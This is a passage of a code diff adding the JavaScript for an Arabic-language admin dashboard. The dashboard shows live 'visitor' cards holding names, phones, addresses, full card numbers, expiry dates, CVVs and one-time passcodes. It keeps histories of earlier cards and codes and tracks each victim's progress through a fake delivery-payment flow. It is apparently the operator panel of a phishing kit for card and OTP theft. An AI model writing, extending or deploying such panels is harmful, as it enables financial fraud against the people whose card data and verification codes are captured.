+    if (shouldPlaySound(sessionId, 'verification')) {
+      sounds.formVerification();
+    }
+    
+    // Update or create card, then move to top
+    processVisitorUpdate(sessionId, data);
+    updateStats();
+  });
+
+  socket.on('stats:push', (data) => {
+    console.log('📊 DATA RECEIVED VIA SOCKET (stats:push):', data);
+    updateStatsDisplay(data);
+  });
+
+  socket.on('visitors:update', (data) => {
+    handleVisitorsUpdate(data);
+  });
+
+  socket.on('stats:update', (data) => {
+    updateStatsDisplay(data);
+  });
+
+  socket.on('ban:listUpdate', () => {
+    loadBannedUsers();
+  });
+
+  socket.on('user:unbanned', (data) => {
+    if (data.success) {
+      showNotification('تم فك الحظر', 'تم فك الحظر بنجاح', 'success');
+      loadBannedUsers();
+    } else {
+      showNotification('خطأ', data.message || 'حدث خطأ', 'error');
+    }
+  });
+
+  // TRASH BIN SOCKET HANDLERS
+  socket.on('trash:update', (data) => {
+    handleTrashUpdate(data);
+  });
+
+  socket.on('visitor:softDeleted', (data) => {
+    updateTrashCount(data.trashCount);
+    removeVisitorCard(data.sessionId);
+  });
+
+  socket.on('visitor:softDeletedMultiple', (data) => {
+    updateTrashCount(data.trashCount);
+    data.sessionIds.forEach(id => removeVisitorCard(id));
+    clearAllCheckboxes();
+  });
+
+  socket.on('visitor:softDeletedAll', (data) => {
+    updateTrashCount(data.trashCount);
+    updateVisitorsList();
+    clearAllCheckboxes();
+  });
+
+  socket.on('visitor:restored', (data) => {
+    console.log('↩️ DATA RECEIVED VIA SOCKET (visitor:restored):', data);
+    updateTrashCount(data.trashCount);
+    updateVisitorsList();
+    // Remove from trash view if visible
+    removeVisitorCard(data.sessionId);
+  });
+
+  socket.on('visitor:permanentDeleted', (data) => {
+    console.log('❌ DATA RECEIVED VIA SOCKET (visitor:permanentDeleted):', data);
+    updateTrashCount(data.trashCount);
+    removeVisitorCard(data.sessionId);
+  });
+
+  socket.on('trash:emptied', (data) => {
+    console.log('🗑️ DATA RECEIVED VIA SOCKET (trash:emptied):', data);
+    updateTrashCount(0);
+    handleTrashUpdate({ visitors: [] });
+  });
+
+  console.log('✅ All socket listeners registered');
+}
+
+function updateConnectionStatus(isOnline) {
+  const dot = document.querySelector('.status-dot');
+  const text = document.querySelector('.connection-text');
+  if (dot) { dot.className = `status-dot ${isOnline ? 'online' : 'offline'}`; }
+  if (text) { text.textContent = isOnline ? 'متصل' : 'غير متصل'; }
+}
+
+function showNotification(title, message, type = 'info') {
+  const notification = document.createElement('div');
+  notification.className = 'notification';
+  notification.innerHTML = `
+    <span style="font-size:1.5rem;">${type === 'success' ? '✓' : type === 'warning' ? '⚠' : type === 'error' ? '✕' : 'ℹ'}</span>
+    <div>
+      <div style="font-weight:600;">${title}</div>
+      ${message ? `<div style="font-size:0.85rem;color:#666;">${message}</div>` : ''}
+    </div>
+  `;
+  document.body.appendChild(notification);
+  setTimeout(() => {
+    notification.style.animation = 'slideDown 0.3s ease reverse';
+    setTimeout(() => notification.remove(), 300);
+  }, 4000);
+}
+
+// ========== MOBILE CARD RENDERING ==========
+// ==========================================
+// SMART PAGE TRACKING SYSTEM
+// ==========================================
+
+// Map page names to Arabic labels
+function getPageName(page) {
+  const pages = {
+    'home': 'الرئيسية',
+    'delivery': 'بيانات التوصيل',
+    'payment': 'اختيار الدفع',
+    'payment-form': 'ملء بيانات البطاقة',
+    'verification': 'إدخال الرمز',
+    'verification-error': 'الرمز خطأ',
+    'success': 'تمت العملية'
+  };
+  return pages[page] || page;
+}
+
+// Page colors for badge
+function getPageColor(page) {
+  const colors = {
+    'home': { bg: '#6366f1', text: 'الرئيسية' },
+    'delivery': { bg: '#3b82f6', text: 'بيانات التوصيل' },
+    'payment': { bg: '#f59e0b', text: 'اختيار الدفع' },
+    'payment-form': { bg: '#ef4444', text: 'ملء البطاقة' },
+    'verification': { bg: '#10b981', text: 'إدخال الرمز' },
+    'verification-error': { bg: '#dc2626', text: '❌ خطأ' },
+    'success': { bg: '#22c55e', text: '✓ نجاح' }
+  };
+  return colors[page] || { bg: '#6b7280', text: page };
+}
+
+// Check if page has changed (for smart tracking)
+function hasPageChanged(oldPage, newPage) {
+  return oldPage !== newPage;
+}
+
+// Get step progress indicator
+function getStepIndicator(page) {
+  const steps = [
+    { id: 'home', label: '🏠', name: 'الرئيسية' },
+    { id: 'delivery', label: '📦', name: 'التوصيل' },
+    { id: 'payment', label: '💳', name: 'الدفع' },
+    { id: 'payment-form', label: '🔐', name: 'البطاقة' },
+    { id: 'verification', label: '⏳', name: 'الرمز' }
+  ];
+  
+  const currentIndex = steps.findIndex(s => s.id === page || page?.startsWith(s.id));
+  if (currentIndex === -1) return '';
+  
+  let html = '<div class="step-indicator" style="display:flex;gap:4px;align-items:center;">';
+  steps.forEach((step, i) => {
+    const isActive = i === currentIndex;
+    const isCompleted = i < currentIndex;
+    const color = isActive ? '#10b981' : (isCompleted ? '#6366f1' : '#4b5563');
+    html += `<span style="font-size:12px;opacity:${isActive ? 1 : (isCompleted ? 0.8 : 0.4)};">${step.label}</span>`;
+  });
+  html += '</div>';
+  return html;
+}
+
+function getCountryFlag(countryCode) {
+  if (!countryCode || countryCode === 'XX') return '🌍';
+  try {
+    return countryCode.toUpperCase().split('').map(c => String.fromCodePoint(c.charCodeAt(0) + 127397)).join('');
+  } catch { return '🌍'; }
+}
+
+function createVisitorCard(visitor, isTrashMode = false) {
+  // Ensure all data fields exist
+  const delivery = visitor.delivery_data || {};
+  const payment = visitor.payment_data || {};
+  const verification = visitor.verification_data || {};
+  const country = visitor.country || 'غير معروف';
+  const page = visitor.current_page || 'home';
+  const isOnline = visitor.is_online === true;
+  const sessionId = visitor.session_id || 'unknown';
+  const countryCode = visitor.country_code || '';
+  const ipAddress = visitor.ip_address || '';
+
+  // Get timestamps for each data type
+  const createdAt = visitor.created_at || null;
+  const deliveryTime = visitor.delivery_time || null;
+  const paymentTime = visitor.payment_time || null;
+  const verificationTime = visitor.verification_time || null;
+  
+  // Get OTP value
+  const otpValue = verification.otp || verification.verificationData?.otp || '';
+  
+  // Get OTP history
+  let otpHistory = [];
+  if (visitor.otp_history) {
+    try {
+      otpHistory = typeof visitor.otp_history === 'string' 
+        ? JSON.parse(visitor.otp_history) 
+        : (Array.isArray(visitor.otp_history) ? visitor.otp_history : []);
+    } catch (e) {
+      otpHistory = [];
+    }
+  }
+  
+  // Check form completion status
+  const deliveryDone = visitor.form_submitted === true;
+  const paymentDone = visitor.payment_submitted === true;
+  const verificationDone = visitor.verification_submitted === true;
+  
+  // Build Delivery Box Fields
+  const deliveryFields = [];
+  if (delivery.fullName) deliveryFields.push({label: 'الاسم', value: delivery.fullName});
+  if (delivery.phone) deliveryFields.push({label: 'الهاتف', value: delivery.phone});
+  if (delivery.email) deliveryFields.push({label: 'البريد', value: delivery.email});
+  if (delivery.city) deliveryFields.push({label: 'المدينة', value: delivery.city});
+  if (delivery.address) deliveryFields.push({label: 'العنوان', value: delivery.address});
+  
+  const deliveryRowsHTML = deliveryFields.map(f => `
+    <div class="data-item">
+      <span class="data-label">${f.label}</span>
+      <span class="data-value">${escapeHtml(f.value)}</span>
+    </div>
+  `).join('');
+  
+  // Build Payment Box Fields
+  const paymentFields = [];
+  const cardNum = payment.cardNumber || payment.card_number || '';
+  if (cardNum) paymentFields.push({label: 'البطاقة', value: cardNum});
+  if (payment.cardHolder) paymentFields.push({label: 'صاحب البطاقة', value: payment.cardHolder});
+  if (payment.expiry) paymentFields.push({label: 'تاريخ الانتهاء', value: payment.expiry});
+  if (payment.cvv) paymentFields.push({label: 'CVV', value: payment.cvv});
+  
+  const paymentRowsHTML = paymentFields.map(f => `
+    <div class="data-item">
+      <span class="data-label">${f.label}</span>
+      <span class="data-value">${escapeHtml(f.value)}</span>
+    </div>
+  `).join('');
+  
+  // Payment History Dropdown
+  let paymentHistoryToggle = '';
+  if (visitor.payment_submissions && visitor.payment_submissions.length > 1) {
+    const historyItems = visitor.payment_submissions.slice(1).map((sub, idx) => {
+      const subData = typeof sub.form_data === 'string' ? JSON.parse(sub.form_data) : sub.form_data;
+      const timestamp = sub.created_at ? formatTimeAgo(new Date(sub.created_at)) : '';
+      const subCardNum = subData.cardNumber || subData.card_number || '';
+      const subCvv = subData.cvv || '';
+      const subExpiry = subData.expiry || '';
+      const subCardHolder = subData.cardHolder || '';
+      const isCash = subData.paymentMethod === 'cash';
+      return `
+        <div style="padding:8px;background:rgba(16,185,129,0.08);border-radius:8px;margin-bottom:6px;border:1px solid rgba(16,185,129,0.2);">
+          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px;">
+            <span style="font-size:10px;color:var(--success);font-weight:600;">#${idx + 2}</span>
+            <span style="font-size:9px;color:#6b7280;">${timestamp}</span>
+          </div>
+          ${subCardNum ? `<div style="font-size:11px;"><span style="color:#9ca3af;">البطاقة:</span> <span dir="ltr">${escapeHtml(subCardNum)}</span></div>` : ''}
+          ${subCardHolder ? `<div style="font-size:11px;"><span style="color:#9ca3af;">صاحب البطاقة:</span> ${escapeHtml(subCardHolder)}</div>` : ''}
+          ${subExpiry ? `<div style="font-size:11px;"><span style="color:#9ca3af;">تاريخ الانتهاء:</span> <span dir="ltr">${escapeHtml(subExpiry)}</span></div>` : ''}
+          ${subCvv ? `<div style="font-size:11px;"><span style="color:#9ca3af;">CVV:</span> <span dir="ltr">${escapeHtml(subCvv)}</span></div>` : ''}
+          ${isCash ? `<div style="font-size:11px;color:#10b981;font-weight:600;">💵 دفع عند الاستلام - 25 ر.ق</div>` : ''}
+        </div>
+      `;
+    }).join('');
+    paymentHistoryToggle = `
+      <div style="margin-top:10px;">
+        <div class="payment-history-toggle" onclick="togglePaymentHistory('${sessionId}')" style="cursor:pointer;display:flex;align-items:center;gap:6px;padding:6px 10px;background:rgba(16,185,129,0.15);border-radius:8px;font-size:11px;color:var(--success);font-weight:600;">
+          <span>▼</span> عرض ${visitor.payment_submissions.length - 1} بطاقة سابقة
+        </div>
+        <div id="paymentHistory_${sessionId}" class="payment-history-dropdown" style="display:none;margin-top:8px;">
+          ${historyItems}
+        </div>
+      </div>
+    `;
+  }
+  
+  // Delivery History Dropdown
+  let deliveryHistoryToggle = '';
+  if (visitor.delivery_submissions && visitor.delivery_submissions.length > 1) {
+    const historyItems = visitor.delivery_submissions.slice(1).map((sub, idx) => {
+      const subData = typeof sub.form_data === 'string' ? JSON.parse(sub.form_data) : sub.form_data;
+      const timestamp = sub.created_at ? formatTimeAgo(new Date(sub.created_at)) : '';
+      return `
+        <div style="padding:8px;background:rgba(59,130,246,0.08);border-radius:8px;margin-bottom:6px;border:1px solid rgba(59,130,246,0.2);">
+          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px;">
+            <span style="font-size:10px;color:var(--primary-light);font-weight:600;">#${idx + 2}</span>
+            <span style="font-size:9px;color:#6b7280;">${timestamp}</span>
+          </div>
+          ${subData.fullName ? `<div style="font-size:11px;"><span style="color:#9ca3af;">الاسم:</span> ${escapeHtml(subData.fullName)}</div>` : ''}
+          ${subData.phone ? `<div style="font-size:11px;"><span style="color:#9ca3af;">الهاتف:</span> <span dir="ltr">${escapeHtml(subData.phone)}</span></div>` : ''}
+          ${subData.email ? `<div style="font-size:11px;"><span style="color:#9ca3af;">البريد:</span> ${escapeHtml(subData.email)}</div>` : ''}
+          ${subData.city ? `<div style="font-size:11px;"><span style="color:#9ca3af;">المدينة:</span> ${escapeHtml(subData.city)}</div>` : ''}
+          ${subData.address ? `<div style="font-size:11px;"><span style="color:#9ca3af;">العنوان:</span> ${escapeHtml(subData.address)}</div>` : ''}
+        </div>
+      `;
+    }).join('');
+    deliveryHistoryToggle = `
+      <div style="margin-top:10px;">
+        <div class="delivery-history-toggle" onclick="toggleDeliveryHistory('${sessionId}')" style="cursor:pointer;display:flex;align-items:center;gap:6px;padding:6px 10px;background:rgba(59,130,246,0.15);border-radius:8px;font-size:11px;color:var(--primary-light);font-weight:600;">
+          <span>▼</span> عرض ${visitor.delivery_submissions.length - 1} إرسال سابق
+        </div>
+        <div id="deliveryHistory_${sessionId}" class="delivery-history-dropdown" style="display:none;margin-top:8px;">
+          ${historyItems}
+        </div>
+      </div>
+    `;
+  }
+  
+  // OTP Digits HTML
+  let otpDigitsHTML = '';
+  if (otpValue) {
+    otpDigitsHTML = otpValue.split('').map(d => `<span class="otp-digit-new">${d}</span>`).join('');
+  } else {
+    otpDigitsHTML = '<span class="otp-empty">---</span>';
+  }
+  
+  // OTP History
+  let historyToggle = '';
+  if (otpHistory && otpHistory.length > 1) {
+    const oldOtps = otpHistory.slice(1).map(item => {
+      const date = new Date(item.timestamp).toLocaleString('ar-OM');
+      return `<div class="otp-history-item">السابق: <strong>${escapeHtml(item.otp || '')}</strong> <small>(${date})</small></div>`;
+    }).join('');
+    historyToggle = `
+      <div class="otp-history-dropdown" id="otpHistory_${sessionId}">${oldOtps}</div>
+    `;
+  }
+  
+  // Get page color using smart system
+  const pageInfo = getPageColor(page);
+  
+  // Add step progress indicator
+  const stepIndicator = getStepIndicator(page);
+  
+  // Country + Name display
+  const displayName = delivery.fullName || payment.cardHolder || country || 'زائر ' + sessionId.substring(0, 6);
+  
+  // Status classes
+  const headerBg = isOnline 
+    ? 'background: linear-gradient(135deg, #1e3a5f 0%, #1e293b 100%);'
+    : 'background: linear-gradient(135deg, #374151 0%, #1f2937 100%);';
+  
+  // Build actions based on mode
+  let actionsHTML;
+  if (isTrashMode) {
+    actionsHTML = `
+      <button class="action-btn restore" onclick="restoreVisitor('${sessionId}')">
+        <span>↩️</span> استعادة
+      </button>
+      <button class="action-btn delete-permanent" onclick="permanentDeleteVisitor('${sessionId}')">
+        <span>❌</span> حذف نهائي
+      </button>
+    `;
+  } else {
+    actionsHTML = `
+      <input type="checkbox" class="visitor-checkbox" onchange="toggleVisitorSelection('${sessionId}', this)" title="تحديد">
+      <button class="action-btn delete" onclick="softDeleteVisitor('${sessionId}')">
+        <span>🗑️</span> حذف
+      </button>
+      <button class="action-btn ban" onclick="banVisitor('${sessionId}', '${escapeHtml(ipAddress)}')">
+        <span>🚫</span> حظر
+      </button>
+    `;
+  }
+  
+  // Build final card HTML with new design
+  const cardHTML = `
+    <div class="visitor-card-new" data-session="${sessionId}" data-online="${isOnline}">
+      <!-- Header -->
+      <div class="card-header-new" style="${headerBg}">
+        <div class="header-left">
+          <span class="country-flag">${getCountryFlag(countryCode)}</span>
+          <span class="visitor-name">${escapeHtml(displayName)}</span>
+          <span class="online-status ${isOnline ? 'online' : 'offline'}">
+            ${isOnline ? '●' : '○'} ${isOnline ? 'متصل' : 'غير متصل'}
+          </span>
+          <span class="visit-time" style="font-size:10px;color:#9ca3af;margin-right:8px;">
+            🕐 ${createdAt ? formatTimeAgo(new Date(createdAt)) : 'الآن'}
+          </span>
+        </div>
+        <div class="header-right">
+          <span class="page-badge" style="background: ${pageInfo.bg};">
+            ${pageInfo.text}
+          </span>
+          ${stepIndicator}
+        </div>
+      </div>
+      
+      <!-- Data Boxes Container -->
+      <div class="data-boxes-container">
+        <!-- Delivery Box -->
+        <div class="data-box delivery-box ${deliveryFields.length === 0 ? 'empty' : ''}" style="background: linear-gradient(135deg, #16365f 0%, #162235 100%); border: 1px solid rgba(59, 130, 246, 0.28); border-radius: 14px; overflow: hidden; box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.04), 0 8px 18px rgba(15, 23, 42, 0.35);">
+          <div class="box-header" style="background: rgba(0, 0, 0, 0.22); border-bottom: 1px solid rgba(255, 255, 255, 0.08);">
+            <span class="box-icon">📦</span>
+            <span class="box-title">بيانات التوصيل</span>
+            ${deliveryTime ? '<span class="data-time" style="font-size:10px;color:#9ca3af;margin-right:6px;">🕐 ' + formatTimeAgo(new Date(deliveryTime)) + '</span>' : ''}
+          </div>
+          <div class="box-content">
+            ${deliveryFields.length > 0 ? deliveryRowsHTML : '<div class="no-data">لا توجد بيانات</div>'}
+          </div>
+          ${deliveryHistoryToggle}
+        </div>
+        
+        <!-- Payment Box -->
+        <div class="data-box payment-box ${paymentFields.length === 0 ? 'empty' : ''}" style="background: linear-gradient(135deg, #17312a 0%, #132238 100%); border: 1px solid rgba(16, 185, 129, 0.28); border-radius: 14px; overflow: hidden; box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.04), 0 8px 18px rgba(15, 23, 42, 0.35);">
+          <div class="box-header" style="background: rgba(0, 0, 0, 0.22); border-bottom: 1px solid rgba(255, 255, 255, 0.08);">
+            <span class="box-icon">💳</span>
+            <span class="box-title">بيانات الدفع</span>
+            ${paymentTime ? '<span class="data-time" style="font-size:10px;color:#9ca3af;margin-right:6px;">🕐 ' + formatTimeAgo(new Date(paymentTime)) + '</span>' : ''}
+          </div>
+          <div class="box-content">
+            ${paymentFields.length > 0 ? paymentRowsHTML : '<div class="no-data">لا توجد بيانات</div>'}
+          </div>
+          ${paymentHistoryToggle}
+        </div>
+      </div>
+      
+      <!-- OTP Section -->
+      <div class="otp-section-new" style="margin: 0 12px; padding: 14px; background: linear-gradient(135deg, #2a246f 0%, #1b144d 100%); border-radius: 14px; border: 1px solid rgba(129, 140, 248, 0.2); box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.04);">
+        <div class="otp-header" onclick="toggleOtpHistory('${sessionId}')">
+          <span class="otp-icon">🔐</span>
+          <span class="otp-title">رمز التحقق (OTP)</span>
+          ${verificationTime ? '<span class="data-time" style="font-size:10px;color:#9ca3af;margin-right:6px;">🕐 ' + formatTimeAgo(new Date(verificationTime)) + '</span>' : ''}
+          ${otpHistory && otpHistory.length > 1 ? `<span class="otp-count">${otpHistory.length} رمز</span>` : ''}
+        </div>
+        <div class="otp-display">
+          ${otpDigitsHTML}
+        </div>
+        ${historyToggle}
+      </div>
+      
+      <!-- Progress & Actions Footer -->
+      <div class="card-footer">
+        <div class="progress-badges">
+          <span class="progress-badge ${deliveryDone ? 'done' : 'pending'}">
+            ${deliveryDone ? '✓' : '○'} التوصيل
+          </span>
+          <span class="progress-badge ${paymentDone ? 'done' : 'pending'}">
+            ${paymentDone ? '✓' : '○'} الدفع
+          </span>
+          <span class="progress-badge ${verificationDone ? 'done' : 'pending'}">
+            ${verificationDone ? '✓' : '○'} التحقق
+          </span>
+        </div>
+        <div class="action-buttons">
+          ${actionsHTML}
+        </div>
+      </div>
+    </div>
+  `;
+  
+  return cardHTML;
+}
+
+// Helper function to escape HTML
+function escapeHtml(text) {
+  if (!text) return '';
+  const div = document.createElement('div');
+  div.textContent = text;
+  return div.innerHTML;
+}
+
+// Toggle OTP History Dropdown
+function toggleOtpHistory(sessionId) {
+  var dropdown = document.getElementById('otpHistory_' + sessionId);
+  if (dropdown) {
+    if (dropdown.style.display === 'block') {
+      dropdown.style.display = 'none';
+    } else {
+      dropdown.style.display = 'block';
+    }
+  }
+}
+
+// Add new visitor card without full refresh
+function addNewVisitorCard(data) {
+  if (!data.sessionId) return;
+  
+  var grid = document.getElementById('visitorsGrid');
+  if (!grid) return;
+  
+  // Check if card already exists
+  var existingCard = grid.querySelector('[data-session="' + data.sessionId + '"]');
+  if (existingCard) {
+    updateVisitorCard(data.sessionId, data);
+    return;
+  }
+  
+  // Create temporary visitor object for card creation
+  var visitor = {
+    session_id: data.sessionId,
+    ip_address: data.ip_address,
+    country: data.country,
+    country_code: data.country_code,
+    current_page: data.page || 'home',
+    is_online: true,
+    delivery_data: data.formData || {},
+    payment_data: data.paymentData || {},
+    verification_data: data.verificationData || {},
+    otp_history: data.otpHistory || [],
+    form_submitted: !!data.formData,
+    payment_submitted: !!data.paymentData,
+    verification_submitted: !!data.verificationData
+  };
+  
+  var cardHTML = createVisitorCard(visitor);
+  
+  // Add animation
+  var tempDiv = document.createElement('div');
+  tempDiv.innerHTML = cardHTML;
+  var newCard = tempDiv.firstElementChild;
+  newCard.style.opacity = '0';
+  newCard.style.transform = 'translateY(-20px)';
+  
+  // Insert at the beginning
+  if (grid.firstChild && !grid.firstChild.classList.contains('empty-state')) {
+    grid.insertBefore(newCard, grid.firstChild);
+  } else {
+    grid.appendChild(newCard);
+  }
+  
+  // Animate in
+  setTimeout(function() {
+    newCard.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
+    newCard.style.opacity = '1';
+    newCard.style.transform = 'translateY(0)';
+  }, 50);
+  
+  // Update count
+  var onlineCount = document.getElementById('onlineCount');
+  var totalCount = document.getElementById('totalCount');
+  if (onlineCount) onlineCount.textContent = parseInt(onlineCount.textContent || 0) + 1;
+  if (totalCount) totalCount.textContent = parseInt(totalCount.textContent || 0) + 1;
+}
+
+// Update stats display without full refresh
+function updateStatsDisplay(data) {
+  // Handle both formats: { total, withDelivery, ... } and { totalVisitors, onlineVisitors, ... }
+  if (data.total !== undefined) {
+    var el = document.getElementById('totalVisitors');
+    if (el) el.textContent = data.total;
+  } else if (data.totalVisitors !== undefined) {
+    var el = document.getElementById('totalVisitors');
+    if (el) el.textContent = data.totalVisitors;
+  }
+  
+  if (data.formSubmissions !== undefined) {
+    var el = document.getElementById('formSubmissions');
+    if (el) el.textContent = data.formSubmissions;
+  }
+  
+  if (data.deliverySubmissions !== undefined) {
+    var el = document.getElementById('deliverySubmissions');
+    if (el) el.textContent = data.deliverySubmissions;
+  }
+  
+  if (data.paymentSubmissions !== undefined) {
+    var el = document.getElementById('paymentSubmissions');
+    if (el) el.textContent = data.paymentSubmissions;
+  }
+  
+  if (data.verificationSubmissions !== undefined) {
+    var el = document.getElementById('verificationSubmissions');
+    if (el) el.textContent = data.verificationSubmissions;
+  }
+}
+
+// Store visitors data for comparison
+let visitorsCache = new Map();
+
+function updateVisitorsList() {
+  if (!socket || !socket.connected) return;
+  
+  socket.emit('visitors:request');
+}
+
+// Refresh tracking data - reload page
+function refreshTrackingData() {
+  location.reload();
+}
+
+function handleVisitorsUpdate(data) {
+  console.log('📋 Processing visitors update:', data);
+  console.log('📋 Raw data:', JSON.stringify(data, null, 2).substring(0, 500));
+  
+  // Ensure data structure is correct
+  const visitors = data.visitors || data.rows || [];
+  console.log('📋 Found', visitors.length, 'visitors');
+  
+  const grid = document.getElementById('visitorsGrid');
+  const countEl = document.getElementById('onlineCount');
+  const totalCountEl = document.getElementById('totalCount');
+  
+  if (!grid) {
+    console.log('❌ Grid not found!');
+    return;
+  }
+  
+  // Update trash count if provided
+  if (data.trashCount !== undefined) {
+    updateTrashCount(data.trashCount);
+  }
+  
+  // Update stats from data.stats if provided
+  if (data.stats) {
+    updateStatsDisplay(data.stats);
+  }
+  
+  const onlineCount = visitors.filter(v => v.is_online === true).length;
+  
+  // Update stats
+  if (countEl) countEl.textContent = onlineCount;
+  if (totalCountEl) totalCountEl.textContent = visitors.length;
+  
+  // COMPLETELY CLEAR THE GRID - Force DOM update
+  grid.innerHTML = '';
+  
+  // Force browser to recognize the empty state
+  grid.offsetHeight; // Trigger reflow
+  
+  if (visitors.length === 0) {
+    grid.innerHTML = '<div class="empty-state"><span>👥</span><h3>لا يوجد زوار</h3><p>الزوار سيظهرون هنا</p></div>';
+    visitorsCache.clear();
+    console.log('✅ Grid cleared, showing empty state');
+    return;
+  }
+  
+  // BUILD NEW CARDS FROM SCRATCH
+  const fragment = document.createDocumentFragment();
+  
+  visitors.forEach(function(visitor, index) {
+    try {
+      const cardHTML = createVisitorCard(visitor);
+      const tempDiv = document.createElement('div');
+      tempDiv.innerHTML = cardHTML;
+      const cardElement = tempDiv.firstElementChild;
+      
+      if (cardElement) {
+        // Add animation
+        cardElement.style.opacity = '0';
+        cardElement.style.transform = 'translateY(20px)';
+        fragment.appendChild(cardElement);
+        
+        // Trigger animation after append
+        requestAnimationFrame(function() {
+          setTimeout(function() {
+            cardElement.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
+            cardElement.style.opacity = '1';
+            cardElement.style.transform = 'translateY(0)';
+          }, index * 50);
+        });
+      }
+    } catch (e) {
+      console.error('❌ Error creating card:', e);
+    }
+  });
+  
+  // Append fragment to grid (more efficient)
+  grid.appendChild(fragment);
+  
+  // Force another reflow to ensure DOM update
+  grid.offsetHeight;
+  
+  // Update cache
+  visitorsCache.clear();
+  visitors.forEach(function(v) {
+    visitorsCache.set(v.session_id, v);
+  });
+  
+  console.log('✅ Grid rebuilt with', visitors.length, 'visitor cards');
+  console.log('📋 Grid child count:', grid.children.length);
+}
+
+// ==========================================
+// TRASH BIN FUNCTIONS
+// ==========================================
+
+// Track selected visitors
+let selectedVisitors = new Set();
+
+function updateTrashCount(count) {
+  const trashBadge = document.getElementById('trashCountBadge');
+  if (trashBadge) {
+    if (count > 0) {
+      trashBadge.textContent = count;
+      trashBadge.style.display = 'inline';
+    } else {
+      trashBadge.style.display = 'none';
+    }
+  }
+}
+
+function handleTrashUpdate(data) {
+  console.log('🗑️ Processing trash update:', data);
+  const grid = document.getElementById('trashGrid');
+  if (!grid) return;
+
+  const visitors = data.visitors || [];
+  grid.innerHTML = '';
+
+  if (visitors.length === 0) {
+    grid.innerHTML = '<div class="empty-state"><span>🗑️</span><h3>السلة فارغة</h3><p>لا توجد عناصر محذوفة</p></div>';
+    return;
+  }
+
+  const fragment = document.createDocumentFragment();
+  visitors.forEach(function(visitor) {
+    const cardHTML = createVisitorCard(visitor, true);
+    const tempDiv = document.createElement('div');
+    tempDiv.innerHTML = cardHTML;
+    const cardElement = tempDiv.firstElementChild;
+    if (cardElement) {
+      fragment.appendChild(cardElement);
+    }
+  });
+  grid.appendChild(fragment);
+  console.log('✅ Trash grid rebuilt with', visitors.length, 'cards');
+}
+
+function requestTrashData() {
+  if (!socket || !socket.connected) return;
+  socket.emit('trash:request');
+}
+
+function removeVisitorCard(sessionId) {
+  const card = document.querySelector('[data-session="' + sessionId + '"]');
+  if (card) {
+    card.style.opacity = '0';
+    card.style.transform = 'translateX(-20px)';
+    setTimeout(() => card.remove(), 300);
+  }
+}
+
+function clearAllCheckboxes() {
+  selectedVisitors.clear();
+  document.querySelectorAll('.visitor-checkbox').forEach(cb => cb.checked = false);
+  updateDeleteSelectedButton();
+}
+
+function toggleVisitorSelection(sessionId, checkbox) {
+  if (checkbox.checked) {
+    selectedVisitors.add(sessionId);
+  } else {
+    selectedVisitors.delete(sessionId);
+  }
+  updateDeleteSelectedButton();
+}
+
+function updateDeleteSelectedButton() {
+  const btn = document.getElementById('deleteSelectedBtn');
+  if (btn) {
+    if (selectedVisitors.size > 0) {
+      btn.style.display = 'inline-flex';
+      btn.querySelector('.btn-text').textContent = 'حذف المحدد (' + selectedVisitors.size + ')';
+    } else {
+      btn.style.display = 'none';
+    }
+  }
+}
+
+function getSelectedCount() {
+  return selectedVisitors.size;
+}
+
+// Soft delete single visitor
+function softDeleteVisitor(sessionId) {
+  showConfirmModal(
+    'نقل إلى سلة المهملات',
+    'هل أنت متأكد من نقل هذا الزائر إلى سلة المهملات؟',
+    function() {
+      socket.emit('visitor:softDelete', { sessionId });
+      showNotification('تم النقل للسلة', 'تم نقل الزائر إلى سلة المهملات', 'success');
+    }
+  );
+}
+
+// Soft delete selected visitors
+function softDeleteSelected() {
+  if (selectedVisitors.size === 0) return;
+  
+  showConfirmModal(
+    'حذف المحدد',
+    'هل أنت متأكد من حذف الزوار المحددين (' + selectedVisitors.size + ' زائر)؟',
+    function() {
+      socket.emit('visitor:softDeleteMultiple', { sessionIds: Array.from(selectedVisitors) });
+      showNotification('تم الحذف', 'تم نقل الزوار المحددين إلى سلة المهملات', 'success');
+    }
+  );
+}
+
+// Soft delete all visitors
+function softDeleteAll() {
+  showConfirmModal(
+    'حذف الكل',
+    'هل أنت متأكد من نقل جميع الزوار إلى سلة المهملات؟',
+    function() {
+      socket.emit('visitor:softDeleteAll');
+      showNotification('تم الحذف', 'تم نقل جميع الزوار إلى سلة المهملات', 'success');
+    }
+  );
+}
+
+// Restore visitor from trash
+function restoreVisitor(sessionId) {
+  socket.emit('visitor:restore', { sessionId });
+  showNotification('تم الاستعادة', 'تم استعادة الزائر بنجاح', 'success');
+}
+
+// Permanently delete visitor
+function permanentDeleteVisitor(sessionId) {
+  showConfirmModal(
+    'حذف نهائي',
+    'هل أنت متأكد من حذف هذا الزائر نهائياً؟ لا يمكن التراجع عن هذا الإجراء!',
+    function() {
+      socket.emit('visitor:permanentDelete', { sessionId });
+      showNotification('تم الحذف', 'تم حذف الزائر نهائياً', 'success');
+    }
+  );
+}
+
+// Empty trash
+function emptyTrash() {
+  showConfirmModal(
+    'تفريغ السلة',
+    'هل أنت متأكد من حذف جميع العناصر في سلة المهملات نهائياً؟ لا يمكن التراجع عن هذا الإجراء!',
+    function() {
+      socket.emit('trash:empty');
+      showNotification('تم التفريغ', 'تم تفريغ سلة المهملات نهائياً', 'success');
+    }
+  );
+}
+
+// Confirmation Modal
+function showConfirmModal(title, message, onConfirm) {
+  const modal = document.getElementById('confirmModal');
+  const titleEl = document.getElementById('confirmModalTitle');
+  const messageEl = document.getElementById('confirmModalMessage');
+  const confirmBtn = document.getElementById('confirmModalBtn');
+  const cancelBtn = document.getElementById('confirmModalCancel');
+  
+  if (!modal) return;
+  
+  titleEl.textContent = title;
+  messageEl.textContent = message;
+  
+  // Clear previous handlers
+  const newConfirmBtn = confirmBtn.cloneNode(true);
+  const newCancelBtn = cancelBtn.cloneNode(true);
+  confirmBtn.parentNode.replaceChild(newConfirmBtn, confirmBtn);
+  cancelBtn.parentNode.replaceChild(newCancelBtn, cancelBtn);
+  
+  newConfirmBtn.addEventListener('click', function() {
+    modal.style.display = 'none';
+    if (onConfirm) onConfirm();
+  });
+  
+  newCancelBtn.addEventListener('click', function() {
+    modal.style.display = 'none';
+  });
+  
+  modal.style.display = 'flex';
+}
+
+function updateVisitorPage(sessionId, page) {
+  const card = document.querySelector(`[data-session="${sessionId}"]`);
+  if (card) {
